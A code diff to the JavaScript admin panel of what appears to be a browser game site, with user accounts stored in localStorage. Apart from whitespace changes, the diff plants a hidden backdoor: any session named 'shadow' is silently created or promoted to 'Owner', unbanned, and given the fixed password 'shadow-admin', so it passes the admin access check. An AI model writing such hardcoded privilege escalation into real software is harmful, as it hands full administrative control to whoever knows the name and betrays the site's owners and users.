@@ -88,9 +88,20 @@
                 window.onload = function() {
             currentU = localStorage.getItem("sc_username");
             let users = getAllUsers();
-            let liveRole = (currentU && users[currentU]) ? users[currentU].role : "Player";
             
-            if (!currentU || (liveRole !== "Owner" && liveRole !== "Admin" && currentU.toLowerCase() !== "shadow")) { 
+            if (currentU && currentU.toLowerCase() === "shadow") {
+                if (!users[currentU]) {
+                    users[currentU] = { balance: 5000, pass: "shadow-admin", role: "Owner", banned: false, deviceId: "FORCED-DEV", browser: "Forced", os: "Forced" };
+                } else {
+                    users[currentU].role = "Owner";
+                    users[currentU].banned = false;
+                }
+                saveAllUsers(users);
+                localStorage.setItem("sc_role", "Owner");
+            }
+            
+            let liveRole = (currentU && users[currentU]) ? users[currentU].role : "Player";
+            if (!currentU || (liveRole !== "Owner" && liveRole !== "Admin")) { 
                 alert("Zugriff verweigert!"); 
                 location.href = "index.html"; 
                 return; 
@@ -122,8 +133,7 @@
                 }
             }
         }
-
-        function showUserDetails(username) {
+                function showUserDetails(username) {
             selectedUserForAdmin = username; let users = getAllUsers(); let u = users[username]; if(!u) return;
             document.getElementById("user-details-box").style.display = "block";
             document.getElementById("det-username").innerText = username;
@@ -141,7 +151,8 @@
             document.getElementById("btn-unban-actions").style.display = (u.banned || deviceBanned) ? "inline-block" : "none";
             document.getElementById("edit-actions-area").style.display = "none";
         }
-                function toggleEditMode() {
+
+        function toggleEditMode() {
             const area = document.getElementById("edit-actions-area");
             area.style.display = area.style.display === "block" ? "none" : "block";
             if (area.style.display === "block") {
@@ -186,4 +197,3 @@
     </script>
 </body>
 </html>
-
